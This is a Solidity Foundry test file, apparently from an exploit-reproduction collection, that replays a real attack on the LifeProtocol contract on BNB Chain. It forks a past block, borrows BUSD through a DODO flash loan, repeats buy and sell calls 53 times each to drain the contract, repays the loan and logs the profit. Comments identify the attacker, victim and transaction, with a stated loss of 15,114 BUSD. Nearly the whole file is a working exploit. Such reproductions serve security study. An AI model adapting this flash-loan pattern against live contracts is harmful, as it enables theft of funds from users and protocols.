// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 15114 BUSD
// Attacker : https://bscscan.com/address/0x3026C464d3Bd6Ef0CeD0D49e80f171b58176Ce32
// Attack Contract : https://bscscan.com/address/0xF6Cee497DFE95A04FAa26F3138F9244a4d92f942
// Vulnerable Contract : https://bscscan.com/address/0x42e2773508e2ae8ff9434bea599812e28449e2cd
// Attack Tx : https://bscscan.com/tx/0x487fb71e3d2574e747c67a45971ec3966d275d0069d4f9da6d43901401f8f3c0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x42e2773508e2ae8ff9434bea599812e28449e2cd#code

// @Analysis
// Post-mortem :  
// Twitter Guy :  
// Hacking God :  

address constant LifeProtocolContract = 0x42e2773508e2AE8fF9434BEA599812e28449e2Cd;
address constant dpp = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
address constant busd = 0x55d398326f99059fF775485246999027B3197955;
address constant lifeToken = 0x19B2834f99Fb9eB4164CB5b49046Ec207F894197;

contract LifeProtocol_exp is Test {
    uint256 public quoteAmount = 110000 * 1e18;

    function setUp() public {
        vm.createSelectFork("bsc", 48703546 - 1);
        IFS(busd).approve(LifeProtocolContract, quoteAmount);
        IFS(lifeToken).approve(LifeProtocolContract, quoteAmount);
    }

    function testExploit() public {
        IFS(dpp).flashLoan(0, quoteAmount, address(this), abi.encodePacked(uint256(1)));
        console2.log("Profit:", IFS(busd).balanceOf(address(this)) / 1e18, 'BUSD');
    }

    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) public {
        for(uint256 i=0; i<53; i++) {
            IFS(LifeProtocolContract).buy(1000 * 1e18);
        }
        
        for(uint256 i=0; i<53; i++) {
            IFS(LifeProtocolContract).sell(1000 * 1e18);
        }
        IFS(busd).transfer(dpp, quoteAmount);
    }
}

interface IFS is IERC20 {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function balanceOf(address owner) external view returns (uint256);

    function buy(uint256 lifeTokenAmount) external;

    function sell(uint256 amount) external;
}
